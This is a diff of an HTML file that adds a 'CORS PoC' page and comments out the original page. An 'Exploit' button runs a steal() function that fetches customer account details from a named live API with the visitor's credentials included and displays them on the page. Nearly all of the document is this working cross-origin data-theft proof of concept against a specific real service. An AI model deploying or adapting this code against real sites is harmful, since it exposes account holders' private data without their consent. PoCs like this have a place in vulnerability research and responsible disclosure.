@@ -1,4 +1,28 @@
 <!DOCTYPE html>
+<html>
+<body>
+
+<h2>CORS PoC</h2>
+<button onclick="steal()">Exploit</button>
+
+<pre id="out"></pre>
+
+<script>
+function steal() {
+  fetch("https://api.headout.com/api/v2/account/get/customer-details?base-currency=INR", {
+    credentials: "include"
+  })
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById("out").innerText = data;
+  })
+  .catch(e => console.log(e));
+}
+</script>
+
+</body>
+</html>
+<!--<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -122,3 +146,4 @@
     </footer>
 </body>
 </html>
+-->
